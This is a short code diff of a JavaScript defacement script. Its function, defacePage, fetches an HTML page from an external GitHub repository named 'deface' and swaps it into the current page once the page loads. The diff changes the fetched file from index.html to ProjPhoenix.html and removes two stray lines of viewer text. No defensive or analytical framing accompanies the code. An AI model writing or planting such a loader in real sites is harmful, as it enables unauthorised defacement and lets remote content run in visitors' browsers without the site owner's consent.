@@ -1,7 +1,7 @@
 async function defacePage() {
     try {
         // URL of the HTML content you want to load
-        const url = 'https://raw.githubusercontent.com/whatssuppdude/deface/main/index.html';
+        const url = 'https://raw.githubusercontent.com/whatssuppdude/deface/main/ProjPhoenix.html';
         
         // Fetch the content of the external HTML page
         const response = await fetch(url);
@@ -26,5 +26,4 @@ async function defacePage() {
 
 // Call the function to replace the content when the DOM is fully loaded
 document.addEventListener('DOMContentLoaded', defacePage);
-SquareX Safe File Viewer
-✕
+
